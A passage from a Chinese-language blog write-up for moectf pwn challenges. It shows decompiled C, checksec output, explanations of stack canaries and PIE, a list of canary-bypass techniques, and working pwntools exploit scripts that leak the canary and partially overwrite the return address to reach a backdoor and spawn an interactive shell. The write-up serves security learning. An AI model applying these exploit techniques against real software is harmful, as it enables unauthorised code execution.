= <span class="string">b&#x27;A&#x27;</span> * <span class="number">32</span> + <span class="string">b&#x27;xdulaker&#x27;</span> + <span class="string">b&#x27;B&#x27;</span> * <span class="number">24</span></span><br><span class="line">p.send(payload1)</span><br><span class="line">p.recvuntil(<span class="string">&quot;I will teach you a lesson.\n&quot;</span>)</span><br><span class="line">p.recv(<span class="number">1</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">p.recvline()</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">payload2 = <span class="string">b&quot;a&quot;</span>*<span class="number">56</span>+p64(ret_addr)+p64(backdoor_addr)</span><br><span class="line">p.send(payload2)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<h1 id="Week3"><a href="#Week3" class="headerlink" title="Week3"></a>Week3</h1><h2 id="ezprotection"><a href="#ezprotection" class="headerlink" title="ezprotection"></a>ezprotection</h2><p>IDA分析：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">    setup(argc, argv, envp);</span><br><span class="line">    vuln();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">24</span>]; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(aThisTimeIWon);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Here is a beautiful canary, and it will be watching over you.&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x2A</span>uLL);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Go ahead and overflow, anyway I have a canary.&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(buf);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;I will give you a second chance, since you can not do anything anyway.&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(aEvenIfYouKillT);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x2A</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> v2 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> __noreturn <span class="title function_">backdoor</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  _QWORD buf[<span class="number">2</span>]; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line"></span><br><span class="line">  buf[<span class="number">1</span>] = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Give me the password!&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">8uLL</span>);</span><br><span class="line">  <span class="keyword">if</span> ( buf[<span class="number">0</span>] == password )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;You find the secret:&quot;</span>);</span><br><span class="line">    fd = open(<span class="string">&quot;/flag&quot;</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> ( fd == <span class="number">-1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Failed to open flag file.&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    read(fd, &amp;flag, <span class="number">0x64</span>uLL);</span><br><span class="line">    write(<span class="number">1</span>, &amp;flag, <span class="number">0x64</span>uLL);</span><br><span class="line">    close(fd);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>checksec分析：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">checksec --file=./ezprotection</span></span><br><span class="line">RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE</span><br><span class="line">Full RELRO      Canary found      NX enabled    PIE enabled     No RPATH   No RUNPATH   52 Symbols        No    0               1               ./ezprotection</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>保护全开，目的是考察如何绕过保护，尤其是<strong>canary</strong>与<strong>PIE</strong></p>
<h3 id="what-is-canary"><a href="#what-is-canary" class="headerlink" title="what is canary?"></a><strong>what is canary?</strong></h3><p>栈金丝雀，也称为栈饼干或金丝雀值，是<strong>用于检测和防止缓冲区溢出攻击的安全措施</strong>。 这种攻击发生在程序向缓冲区写入超出其容量的数据时，可能会覆盖相邻的存储位置并在过程中执行恶意代码。 栈金丝雀是放置在本地变量和栈中的返回地址之间的随机值。 当函数即将返回时，检查金丝雀值是否已被修改。 如果修改过，这表明发生了缓冲区溢出，程序可以终止以防止执行恶意代码。</p>
<h3 id="what-is-PIE"><a href="#what-is-PIE" class="headerlink" title="what is PIE?"></a>what is PIE?</h3><p>PIE全称是position-independent executable，中文解释为地址无关可执行文件，该技术是一个针对代码段（.text）、数据段（.data）、未初始化全局变量段（.bss）等固定地址的一个防护技术，如果程序开启了PIE保护的话，在每次加载程序时都变换加载地址，从而不能通过ROPgadget等一些工具来帮助解题</p>
<h3 id="how-to-bypass-canary"><a href="#how-to-bypass-canary" class="headerlink" title="how to bypass canary?"></a>how to bypass canary?</h3><p>要<strong>绕过canary保护机制</strong>，可以考虑以下几种方法：</p>
<ul>
<li>栈溢出：通过栈溢出将低位的\x00覆盖，从而读取canary的值，并重新构造payload以获取shell。</li>
<li>泄露canary：通过覆盖前面的\x00让输出函数泄露canary，或者使用printf定点泄露。</li>
<li>逐字节爆破：逐字节尝试获取随机数，通常只需尝试较少次数即可猜测目标随机数。</li>
<li>栈迁移：在多线程环境中，修改TLS的canary，利用栈迁移的思想进行绕过。</li>
</ul>
<h3 id="脚本分析-5"><a href="#脚本分析-5" class="headerlink" title="脚本分析"></a>脚本分析</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.os = <span class="string">&quot;linux&quot;</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line">count = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="comment">#p = process(&#x27;./ezprotection&#x27;)</span></span><br><span class="line">    p=remote(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">44585</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;watching over you.\n&#x27;</span>)</span><br><span class="line">    payload1 = <span class="string">b&#x27;A&#x27;</span> * <span class="number">22</span> + <span class="string">b&#x27;wr&#x27;</span>   <span class="comment">#填充栈空间，最后两位作为标记为用于接收</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    p.sendline(payload1)           <span class="comment">#使用sendline发送换行符，覆盖canary的低位\x00，保证完整输出</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;I have a canary.\n&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;wr&#x27;</span>)</span><br><span class="line">    canary_part =u64(p.recv(<span class="number">8</span>))-<span class="number">0xa</span> <span class="comment">#接收canary</span></span><br><span class="line">    canary = canary_part </span><br><span class="line">    log.info(<span class="string">f&quot;Canary: <span class="subst">&#123;<span class="built_in">hex</span>(canary)&#125;</span>&quot;</span>)</span><br><span class="line">    rbp_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">    payload2 = <span class="string">b&quot;A&quot;</span>*<span class="number">24</span>+p64(canary)+p64(rbp_addr) +p8(<span class="number">0x7d</span>)+p8(<span class="number">0x12</span>) </span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    24字节垃圾字符填充栈空间+canary+原rbp（不知道什么原因，后门函数需要用到这个）+2字节溢出覆盖低4位</span></span><br><span class="line"><span class="string">    根据gdb调试可以分析出main和backdoor之间只有第三位不同，所以我们有机会爆破出低第4位的值，概率为16分之1</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        count += <span class="number">1</span></span><br><span class="line">        <span class="built_in">print</span>(count,end=<span class="string">&#x27; &#x27;</span>)</span><br><span class="line"></span><br><span class="line">        p.send(payload2)</span><br><span class="line">        p.recvuntil(<span class="string">b&quot;overflow enough bytes.\n&quot;</span>)</span><br><span class="line">        recv = p.recvuntil(<span class="string">&quot;ou find the secret:\n&quot;</span>,timeout=<span class="number">10</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;error&quot;</span>,end=<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line"></span><br><span class="line">        p.interactive()</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<h2 id="fmt-T"><a href="#fmt-T" class="headerlink" title="fmt_T"></a>fmt_T</h2><p>IDA分析：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> s[<span class="number">24</span>]; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line">    <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">    v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">    init(argc, argv, envp);</span><br><span class="line">    fgets(s, <span class="number">6</span>, <span class="built_in">stdin</span>);</span><br><span class="line">    <span class="built_in">printf</span>(s);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Anyone who uses format strings should be punished!\nGo to hell!&quot;</span>);</span><br><span class="line">    hell(<span class="number">5LL</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">hell</span><span class="params">(<span class="type">int</span> n)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">88</span>]; <span class="comment">// [rsp+10h] [rbp-60h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+68h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;You&#x27;ve reached the level %d of hell.\n&quot;</span>, n);</span><br><span class="line">  <span class="keyword">if</span> ( n &lt;= <span class="number">30</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    fgets(s, n, <span class="built_in">stdin</span>);</span><br><span class="line">    hell((<span class="type">unsigned</span> <span class="type">int</span>)(n + <span class="number">11</span>));</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)pd(s, n) )</span><br><span class="line">      <span class="built_in">printf</span>(s);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;You&#x27;ve been swallowed by hell.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v3 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br><span class="line">__int64 __fastcall <span class="title function_">pd</span><span class="params">(__int64 a1, <span class="type">unsigned</span> __int64 i_1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 i; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0LL</span>; i &lt; i_1; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)(a1 + i) == <span class="number">37</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>checksec分析：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">checksec --file=./pwn</span>         </span><br><span class="line">RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE</span><br><span class="line">Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   44 Symbols        No    0               2               ./pwn</span><br></pre></td></tr></table></figure></div>

<h3 id="how-to-use-fmt-to-wite-memory"><a href="#how-to-use-fmt-to-wite-memory" class="headerlink" title="how to use fmt to wite memory?"></a>how to use fmt to wite memory?</h3><p>在之前的尝试中，我们主要使用fmt读取栈上的内存信息，但是fmt还有一个主要使用方式是写入内存</p>

        </div>

        
            <div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
                <div class="article-copyright-info-container">
    <ul>
        <li><strong>标题:</strong> 全栈之旅：从moectf开始的pwn入门指南</li>
        <li><strong>作者:</strong> Wang1r</li>
        <li><strong>创建于
                :</strong> 2025-09-09 21:57:11</li>
        
            <li>
                <strong>更新于
                    :</strong> 2025-10-07 20:18:12
            </li>
        
        <li>
            <strong>链接:</strong> https://wang1rrr.github.io/2025/09/09/全栈之旅：从moectf开始的pwn入门指南/
        </li>
        <li>
            <strong>
                版权声明:
            </strong>
            

            
                本文章采用 <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a> 进行许可。
            
        </li>
    </ul>
</div>

            </div>
        

        
            <ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
                
                    <li class="tag-item mx-0.5">
                        <a href="/tags/CTF/">#CTF</a>&nbsp;
                    </li>
                
                    <li class="tag-item mx-0.5">
                        <a href="/tags/WP/">#WP</a>&nbsp;
                    </li>
                
            </ul>
        

        

        
            <div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
                
                
                    <div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
                        <a class="next"
                        rel="next"
                        href="/2025/08/21/SimpleNet_%20A%20Simple%20Network%20for%20Image%20Anomaly%20Detection%20and%20Localization%20%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/"
                        >
                            <span class="title flex justify-center items-center">
                                <span class="post-nav-title-item">SimpleNet_ A Simple Network for Image Anomaly Detection and Localization</span>
                                <span class="post-nav-item">下一篇</span>
                            </span>
                            <span class="right arrow-icon flex justify-center items-center">
                                <i class="fa-solid fa-chevron-right"></i>
                            </span>
                        </a>
                    </div>
                
            </div>
        


        
    </div>

    
        <div class="toc-content-container">
            <div class="post-toc-wrap">
    <div class="post-toc">
        <div class="toc-title">目录</div>
        <div class="page-title">全栈之旅：从moectf开始的pwn入门指南</div>
        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Week1"><span class="nav-text">Week1</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%BC%8F%E6%B4%9E%E5%AE%A1%E8%AE%A1%E5%85%A5%E9%97%A8%E6%8C%87%E5%8C%97"><span class="nav-text">二进制漏洞审计入门指北</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#what-is-pwntools"><span class="nav-text">what is pwntools</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#how-to-use-pwntools"><span class="nav-text">how to use pwntools</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%84%9A%E6%9C%AC%E8%A7%A3%E6%9E%90"><span class="nav-text">脚本解析</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#EZtext"><span class="nav-text">EZtext</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#what-is-ret2text%EF%BC%9F"><span class="nav-text">what is ret2text？</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#what-is-stack-stack-buffer-overflow%EF%BC%9F"><span class="nav-text">what is stack stack buffer overflow？</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#how-to-understand-stack-buffer-overflow%EF%BC%9F"><span class="nav-text">how to understand stack buffer overflow？</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#how-to-solve-a-ret2text-problem"><span class="nav-text">how to solve a ret2text problem?</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#what-is-gadget"><span class="nav-text">what is gadget?</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#what-is-ROP"><span class="nav-text">what is ROP?</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%84%9A%E6%9C%AC%E8%A7%A3%E6%9E%90-1"><span class="nav-text">脚本解析</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ez-u64"><span class="nav-text">ez_u64</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%84%9A%E6%9C%AC%E8%A7%A3%E6%9E%90-2"><span class="nav-text">脚本解析</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#fmt"><span class="nav-text">fmt</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#what-is-fmt"><span class="nav-text">what is fmt?</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#how-to-use-fmt"><span class="nav-text">how to use fmt?</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%84%9A%E6%9C%AC%E8%A7%A3%E6%9E%90-3"><span class="nav-text">脚本解析</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#randomlock"><span class="nav-text">randomlock</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#what-is-Pseudorandomness%EF%BC%9F"><span class="nav-text">what is Pseudorandomness？</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#how-to-use-Pseudorandomness%EF%BC%9F"><span class="nav-text">how to use Pseudorandomness？</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%84%9A%E6%9C%AC%E8%A7%A3%E6%9E%90-4"><span class="nav-text">脚本解析</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#str-check"><span class="nav-text">str_check</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#how-to-bypass-string-checking"><span class="nav-text">how to bypass string checking</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%84%9A%E6%9C%AC%E5%88%86%E6%9E%90"><span class="nav-text">脚本分析</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#syslock"><span class="nav-text">syslock</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#what-is-ret2syscall"><span class="nav-text">what is ret2syscall?</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#how-to-solve-a-ret2syscall-problem"><span class="nav-text">how to solve a ret2syscall problem?</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#what-is-ret2libc"><span class="nav-text">what is ret2libc?</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#what-is-GOT"><span class="nav-text">what is GOT?</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#what-is-PLT"><span class="nav-text">what is PLT?</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%84%9A%E6%9C%AC%E8%A7%A3%E6%9E%90%EF%BC%9A"><span class="nav-text">脚本解析：</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ezlibc"><span class="nav-text">ezlibc</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#how-to-understand-lazy-binding"><span class="nav-text">how to understand lazy binding?</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%84%9A%E6%9C%AC%E8%A7%A3%E6%9E%90%EF%BC%9A-1"><span class="nav-text">脚本解析：</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#fmt-S"><span class="nav-text">fmt_S</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#how-to-solve-a-Non-stack-Format-String-Vulnerability-problem"><span class="nav-text">how to solve a Non-stack Format String Vulnerability problem</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%84%9A%E6%9C%AC%E8%A7%A3%E6%9E%90-5"><span class="nav-text">脚本解析</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Week2"><span class="nav-text">Week2</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#ezshellcode"><span class="nav-text">ezshellcode</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#what-is-shellcode"><span class="nav-text">what is shellcode?</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#how-to-solve-a-ret2shellcode-problem"><span class="nav-text">how to solve a ret2shellcode problem?</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%84%9A%E6%9C%AC%E5%88%86%E6%9E%90-1"><span class="nav-text">脚本分析</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#find-it"><span class="nav-text">find_it</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#what-is-file-descriptor"><span class="nav-text">what is file descriptor?</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%84%9A%E6%9C%AC%E5%88%86%E6%9E%90-2"><span class="nav-text">脚本分析</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%AE%A4%E8%AF%86libc"><span class="nav-text">认识libc</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%84%9A%E6%9C%AC%E8%A7%A3%E6%9E%90-6"><span class="nav-text">脚本解析</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ezpivot"><span class="nav-text">ezpivot</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#what-is-stack-migration"><span class="nav-text">**what is **stack migration?</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%84%9A%E6%9C%AC%E5%88%86%E6%9E%90-3"><span class="nav-text">脚本分析</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#xdulaker"><span class="nav-text">xdulaker</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%84%9A%E6%9C%AC%E5%88%86%E6%9E%90-4"><span class="nav-text">脚本分析</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Week3"><span class="nav-text">Week3</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#ezprotection"><span class="nav-text">ezprotection</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#what-is-canary"><span class="nav-text">what is canary?</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#what-is-PIE"><span class="nav-text">what is PIE?</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#how-to-bypass-canary"><span class="nav-text">how to bypass canary?</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%84%9A%E6%9C%AC%E5%88%86%E6%9E%90-5"><span class="nav-text">脚本分析</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#fmt-T"><span class="nav-text">fmt_T</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#how-to-use-fmt-to-wite-memory"><span class="nav-text">how to use fmt to wite memory?</span></a></li></ol></li></ol></li></ol>

    </div>
</div>
        </div>
    
</div>



                

            </div>

            

        </div>

        <div class="main-content-footer">
            <footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
    <div class="info-container py-3 text-center">
        
        <div class="text-center">
            &copy;
            
              <span>2024</span>
              -
            
            2025&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">Wang1r</a>
            
                
                <p class="post-count space-x-0.5">
                    <span>
                        共撰写了 33 篇文章
                    </span>
                    
                </p>
            
        </div>
        
            <script data-swup-reload-script src="https://cn.vercount.one/js"></script>
            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
                
                    <span id="busuanzi_container_site_uv" class="lg:!block">
                        <span class="text-sm">访问人数</span>
                        <span id="busuanzi_value_site_uv"></span>
                    </span>
                
                
                    <span id="busuanzi_container_site_pv" class="lg:!block">
                        <span class="text-sm">总访问量</span>
                        <span id="busuanzi_value_site_pv"></span>
                    </span>
                
            </div>
        
        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
